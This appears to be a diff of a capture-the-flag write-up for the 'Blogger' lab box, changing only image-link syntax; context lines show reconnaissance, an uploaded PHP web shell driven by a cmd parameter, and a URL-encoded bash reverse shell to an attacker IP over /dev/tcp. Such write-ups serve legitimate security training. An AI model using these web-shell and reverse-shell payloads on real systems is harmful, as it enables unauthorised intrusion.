@@ -49,15 +49,15 @@ Nmap done: 1 IP address (1 host up) scanned in 27.82 seconds
 http://192.168.184.217 [200 OK] Apache[2.4.18], Bootstrap[4.0.0], Country[RESERVED][ZZ], Email[example@email.com,mail@example.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[192.168.184.217], JQuery[2.2.3], PasswordField, Script, Title[Blogger | Home]
 ```
 
-![](Pasted%20image%2020260529041057.png)
+![[Pasted image 20260529041057.png]]
 
-![](Pasted%20image%2020260529041042.png)
+![[Pasted image 20260529041042.png]]
 
 [W3layouts](http://w3layouts.com/)
 
-![](Pasted%20image%2020260529041138.png)
+![[Pasted image 20260529041138.png]]
 
-![](Pasted%20image%2020260529041606.png)
+![[Pasted image 20260529041606.png]]
 
 ```zsh
 ┌──(kali㉿kali)-[~/CTF/OffSec/Play/Blogger]
@@ -73,13 +73,13 @@ http://192.168.184.217 [200 OK] Apache[2.4.18], Bootstrap[4.0.0], Country[RESERV
 -o ferox.txt
 ```
 
-![](Pasted%20image%2020260529052106.png)
+![[Pasted image 20260529052106.png]]
 
-![](Pasted%20image%2020260529044207.png)
+![[Pasted image 20260529044207.png]]
 
 http://192.168.184.217/assets/fonts/blog/
 
-![](Pasted%20image%2020260529044305.png)
+![[Pasted image 20260529044305.png]]
 
 ```zsh
 ┌──(kali㉿kali)-[~/CTF/OffSec/Play/Blogger]
@@ -87,9 +87,9 @@ http://192.168.184.217/assets/fonts/blog/
 [sudo] password for kali: 
 192.168.184.217 blogger.pg
 ```
-![](Pasted%20image%2020260529044558.png)
+![[Pasted image 20260529044558.png]]
 
-![](Pasted%20image%2020260529044810.png)
+![[Pasted image 20260529044810.png]]
 
 ```zsh
 ┌──(kali㉿kali)-[~/CTF/OffSec/Play/Blogger]
@@ -170,11 +170,11 @@ Papers: No Results
 
 http://blogger.pg/assets/fonts/blog/wp-content/uploads/2026/05/bnqrombyizqeisf-1780000071.8944.php?cmd=id
 
-![](Pasted%20image%2020260529053002.png)
+![[Pasted image 20260529053002.png]]
 
 http://blogger.pg/assets/fonts/blog/wp-content/uploads/2026/05/bnqrombyizqeisf-1780000071.8944.php?cmd=which%20nc
 
-![](Pasted%20image%2020260529053105.png)
+![[Pasted image 20260529053105.png]]
 
 
 ---
@@ -183,12 +183,12 @@ http://blogger.pg/assets/fonts/blog/wp-content/uploads/2026/05/bnqrombyizqeisf-1
 
 https://www.tagindex.com/cgi-lib/encode/url.cgi
 
-![](Pasted%20image%2020260529055408.png)
+![[Pasted image 20260529055408.png]]
 ```zsh
 http://blogger.pg/assets/fonts/blog/wp-content/uploads/2026/05/bnqrombyizqeisf-1780000071.8944.php?cmd=bash%20-c%20%27exec%20bash%20-i%20%26%3E%2Fdev%2Ftcp%2F192.168.45.195%2F4444%20%3C%261%27
 ```
 
-![](Pasted%20image%2020260529055259.png)
+![[Pasted image 20260529055259.png]]
 
 ```zsh
 ┌──(kali㉿kali)-[~/CTF/OffSec/Play/Blogger]
@@ -232,13 +232,13 @@ www-data@ubuntu-xenial:/tmp$ chmod +x linpeas.sh
 chmod +x linpeas.sh
 ```
 
-![](Pasted%20image%2020260530020640.png)
+![[Pasted image 20260530020640.png]]
 
-![](Pasted%20image%2020260530022011.png)
+![[Pasted image 20260530022011.png]]
 
 ## Rabbit Hole1
 
-![](Pasted%20image%2020260530022121.png)
+![[Pasted image 20260530022121.png]]
 
 ```zsh
 ╔══════════╣ Analyzing Wordpress Files (limit 70)
